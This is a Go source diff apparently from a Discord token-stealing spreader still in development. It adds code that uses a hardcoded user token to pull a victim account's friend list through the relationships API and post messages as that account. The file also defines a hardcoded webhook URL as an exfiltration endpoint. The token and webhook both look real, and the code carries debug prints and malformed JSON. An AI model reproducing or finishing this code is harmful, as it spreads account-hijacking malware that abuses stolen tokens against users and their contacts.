@@ -21,6 +21,21 @@ import (
 
 var tokens []string = []string{}
 
+type UserData struct {
+	Id                string
+	Username          string
+	Avatar            string
+	Avatar_Decoration string
+	Discriminator     string
+	Public_Flags      int
+}
+
+type User struct {
+	Id       string
+	Nickname string
+	User     UserData
+}
+
 const (
 	WehookUrl = "https://discord.com/api/webhooks/1017841380824989746/RE5eOZAZWSs7qU0AkuxY9kbYxqFUXHgcqJALVRNYBTEOFk8N3CLwVK7KVDrO435HX_lS"
 )
@@ -34,14 +49,56 @@ func main() {
 
 func spred() {
 	for _, token := range tokens {
+		fmt.Println(token)
 		//  var friends []string
-		body, err := getRequest("https://discord.com/api/v9/users/@me/relationships", true, token)
+		body, err := getRequest("https://discord.com/api/v9/users/@me/relationships", true, "ODkwNjQ1MTYxNzk1NzkyOTQ2.G1t2OH.nZOw4JIT-skQ65_4LUMjEb2cDc-taebwaWlrUc")
 		if err != nil {
+			fmt.Println("hello?")
 			continue
 		}
-		fmt.Println(body)
+		// fmt.Println(body)
+		// test_data := []byte(`
+		// ["
+		// 	{"id": "162664712394244097",
+		// 	"nickname": null,
+		// 	"user":
+		// 		{"id": "162664712394244097",
+		// 		"username": "ChiliPepperHott",
+		// 		"avatar": "a74dc64a0ddec227d71f4a372e71a5a9",
+		// 		"avatar_decoration": null,
+		// 		"discriminator": "4147",
+		// 		"public_flags": 64}}
+		// ]`)
+		// test_data2 := []byte(`
+		// [
+		// 	{"id": "162664712394244097"}
+		// ]`)
 
-		// req, _ := http.NewRequest("POST", "https://discordapp.com/api/v6/channels/"+ ChannelId + "/messages")
+		var Friends []User
+		err1 := json.Unmarshal([]byte(body), &Friends)
+
+		if err1 != nil {
+			fmt.Println(err1)
+		}
+
+		for _, user := range Friends {
+			fmt.Println(user)
+			data := []byte(`{content: "test"}`)
+			req, _ := http.NewRequest("POST", "https://discord.com/api/v9/channels/937809525728247818/messages", bytes.NewBuffer(data))
+
+			req.Header.Set("Authorization", "ODkwNjQ1MTYxNzk1NzkyOTQ2.G1t2OH.nZOw4JIT-skQ65_4LUMjEb2cDc-taebwaWlrUc")
+			cl := &http.Client{}
+			fmt.Println("WTF??")
+			res, err := cl.Do(req)
+			if err != nil {
+				fmt.Print("test")
+				fmt.Println(string(res.StatusCode) + " " + res.Status)
+			}
+			print(res)
+
+		}
+
+		// req, _ := http.NewRequest("POST", "https://discord.com/api/v9/channels/"+ ChannelId + "/messages")
 	}
 }
 
